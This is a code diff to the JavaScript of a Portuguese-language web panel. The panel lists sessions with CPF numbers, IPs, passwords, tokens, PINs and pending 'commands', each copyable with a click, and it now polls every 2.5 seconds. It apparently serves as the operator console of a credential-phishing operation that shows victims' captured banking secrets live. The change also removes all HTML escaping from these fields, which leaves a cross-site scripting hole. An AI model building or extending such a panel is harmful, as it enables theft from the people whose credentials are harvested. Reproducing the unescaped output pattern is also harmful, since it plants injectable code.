@@ -262,16 +262,16 @@
           if (s.temToken) badges += '<span class="badge token">Token</span>';
           if (s.temComando) badges += '<span class="badge cmd">Comando</span>';
           var dadosValores = '<div class="dados-valores">';
-          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.senha) + '</span></span>';
-          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.token) + '</span></span>';
-          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.pin) + '</span></span>';
-          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span></span>';
+          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span><span class="copy-value" title="Clique para copiar">' + (s.senha || '') + '</span></span>';
+          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span><span class="copy-value" title="Clique para copiar">' + (s.token || '') + '</span></span>';
+          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span><span class="copy-value" title="Clique para copiar">' + (s.pin || '') + '</span></span>';
+          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span><span class="copy-value" title="Clique para copiar">' + ((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span></span>';
           dadosValores += '</div>';
-          var tr = '<tr class="expand-row" data-login="' + escapeHtml(s.login) + '" data-pagina="' + escapeHtml(onde) + '">' +
-            '<td><strong>' + escapeHtml(s.cpfFormatado || s.login) + '</strong><div class="detalhe">IP: ' + escapeHtml(s.ip || '-') + '</div></td>' +
+          var tr = '<tr class="expand-row" data-login="' + (s.login || '') + '" data-pagina="' + (onde || '') + '">' +
+            '<td><strong>' + (s.cpfFormatado || s.login || '') + '</strong><div class="detalhe">IP: ' + (s.ip || '-') + '</div></td>' +
             '<td>' + statusBadge + '</td>' +
             '<td>' + ondeBadge + '</td>' +
-            '<td>' + escapeHtml(s.comando || '-') + '</td>' +
+            '<td>' + (s.comando || '-') + '</td>' +
             '<td>' + (badges || '-') + (dadosValores !== '<div class="dados-valores"></div>' ? dadosValores : '') + '</td>' +
             '<td class="atualizado">' + formatarData(s.lastUpdate) + '</td>' +
             '<td>' + montarAcoes(s.login, onde) + '</td></tr>';
@@ -286,7 +286,7 @@
 
     $(function () {
       carregar();
-      setInterval(carregar, 5000);
+      setInterval(carregar, 2500);
       $('#btn-limpar-todas').on('click', limparTodas);
       $(document).on('click', '#corpo .copy-value', function (e) {
         e.stopPropagation();
